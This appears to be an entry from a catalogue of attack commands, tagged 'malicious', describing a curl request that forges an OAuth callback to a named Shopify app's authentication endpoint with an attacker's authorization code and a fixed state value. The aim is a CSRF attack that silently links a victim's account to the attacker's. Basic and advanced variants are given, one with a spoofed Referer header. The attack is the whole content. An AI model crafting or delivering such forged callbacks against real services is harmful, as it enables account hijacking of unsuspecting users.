---
id: cmd-uuid-003
data: >-
  curl -X GET
  "https://facebookstore.shopifyapps.com/authenticated?code=ATTACKER_AUTH_CODE&state=c2f449f2df5ee64df6173702846bce72e3a57319#=_"
tags:
  - csrf
  - curl
  - malicious
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:15.831Z'
verified: false
validated: true
submitted: true
---
# curl-malicious-link-craft

## Command

```bash
curl -X GET "https://facebookstore.shopifyapps.com/authenticated?code=ATTACKER_AUTH_CODE&state=c2f449f2df5ee64df6173702846bce72e3a57319#=_"
```

## Description

Tests the malicious callback URL for CSRF exploitation by simulating the forged request with attacker's code and fixed state.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `code=ATTACKER_AUTH_CODE` | Attacker's OAuth code | Yes |
| `state=c2f449f2df5ee64df6173702846bce72e3a57319` | Fixed state | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://facebookstore.shopifyapps.com/authenticated?code=abc123&state=c2f449f2df5ee64df6173702846bce72e3a57319#=_"
```

### Advanced Usage

```bash
curl -v -X GET "https://facebookstore.shopifyapps.com/authenticated?..." -H "Referer: https://victim-site.com"
```

## Expected Output

Redirect or success response indicating account linking. In victim context, this would connect accounts silently.

## Related

- [[Related Procedure: Craft-and-Deliver-Malicious-Link]]
